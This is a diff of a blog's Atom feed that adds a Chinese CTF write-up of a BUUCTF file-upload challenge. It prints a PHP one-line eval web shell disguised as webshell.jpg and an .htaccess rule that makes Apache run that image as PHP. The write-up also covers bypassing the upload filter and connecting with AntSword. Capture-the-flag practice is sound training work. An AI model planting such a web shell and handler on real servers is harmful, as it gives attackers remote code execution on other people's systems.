@@ -6,7 +6,7 @@
   <link href="http://example.com/atom.xml" rel="self"/>
   
   <link href="http://example.com/"/>
-  <updated>2021-07-19T00:23:46.905Z</updated>
+  <updated>2021-07-19T01:27:57.110Z</updated>
   <id>http://example.com/</id>
   
   <author>
@@ -21,11 +21,20 @@
     <link href="http://example.com/2021/07/19/buuctf9/"/>
     <id>http://example.com/2021/07/19/buuctf9/</id>
     <published>2021-07-19T00:23:46.000Z</published>
-    <updated>2021-07-19T00:23:46.905Z</updated>
+    <updated>2021-07-19T01:27:57.110Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="MRCTF2020-你传你🐎呢"><a href="#MRCTF2020-你传你🐎呢" class="headerlink" title="[MRCTF2020]你传你🐎呢"></a>[MRCTF2020]你传你🐎呢</h1><p>打开容器，是一道文件上传题</p><h4 id="一-牛刀小试"><a href="#一-牛刀小试" class="headerlink" title="一.牛刀小试"></a>一.牛刀小试</h4><p>先上传一个普通一句话木马webshell.jpg：</p><p><code>&lt;?php @eval($_POST[&#39;pass&#39;]);?&gt;</code></p><p>，然后抓包修改后缀为php，发现上传失败<img src="/2021/07/19/buuctf9/image-20210719090306878.png" alt="image-20210719090306878"></p><p>然后我尝试了phtml、php3等都不能绕过</p><p>试着直接上传webshell.jpg<img src="/2021/07/19/buuctf9/image-20210719090532184.png" alt="image-20210719090532184"></p><p>看到它有回显给我们路径，尝试一下上传.user.ini，但是由于无法确定上传的文件夹内是否已经存在php后缀文件，我猜测存在index.php，但是很可惜失败了</p><h4 id="二-另辟蹊径"><a href="#二-另辟蹊径" class="headerlink" title="二.另辟蹊径"></a>二.另辟蹊径</h4><p>这时候就要复习一个配置文件**.htaccess**</p><p><strong>.htaccess</strong>可以帮我们实现包括：文件夹密码保护、用户自动重定向、自定义错误页面、改变你的文件扩展名、封禁特定IP地址的用户、只允许特定IP地址的用户、禁止目录列表，以及使用其他文件作为index文件等一些功能。</p><p>我们这里上传一个**.htaccess**内容为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;webshell.jpg&quot;&gt;       &#x2F;&#x2F;这里的文件名要和上传的一句话木马的文件名一样            </span><br><span class="line"></span><br><span class="line">　　SetHandler application&#x2F;x-httpd-php</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;FilesMatch&gt;</span><br></pre></td></tr></table></figure><p>这样Apache会将我们指定的文件（webshell.jpg）以php格式解析</p><p>这边还有一点要注意的是：</p><p>上传.htaccess的时候要抓包修改修改文件类型：<img src="/2021/07/19/buuctf9/image-20210719092714176.png" alt="image-20210719092714176"></p><p>最后我们用蚁剑连接就好了<img src="/2021/07/19/buuctf9/image-20210719091956225.png" alt="image-20210719091956225"></p><p><img src="/2021/07/19/buuctf9/image-20210719092031620.png" alt="image-20210719092031620"></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;MRCTF2020-你传你🐎呢&quot;&gt;&lt;a href=&quot;#MRCTF2020-你传你🐎呢&quot; class=&quot;headerlink&quot; title=&quot;[MRCTF2020]你传你🐎呢&quot;&gt;&lt;/a&gt;[MRCTF2020]你传你🐎呢&lt;/h1&gt;&lt;p&gt;打开容器，是一道文件上传</summary>
+      
     
     
     
     
+    <category term="刷题" scheme="http://example.com/tags/%E5%88%B7%E9%A2%98/"/>
     
   </entry>
   
@@ -34,11 +43,13 @@
     <link href="http://example.com/2021/07/17/buuctf8/"/>
     <id>http://example.com/2021/07/17/buuctf8/</id>
     <published>2021-07-17T06:11:11.000Z</published>
-    <updated>2021-07-17T06:11:11.162Z</updated>
+    <updated>2021-07-19T00:25:01.811Z</updated>
     
     
     
     
+    
+    <category term="刷题" scheme="http://example.com/tags/%E5%88%B7%E9%A2%98/"/>
     
   </entry>
   
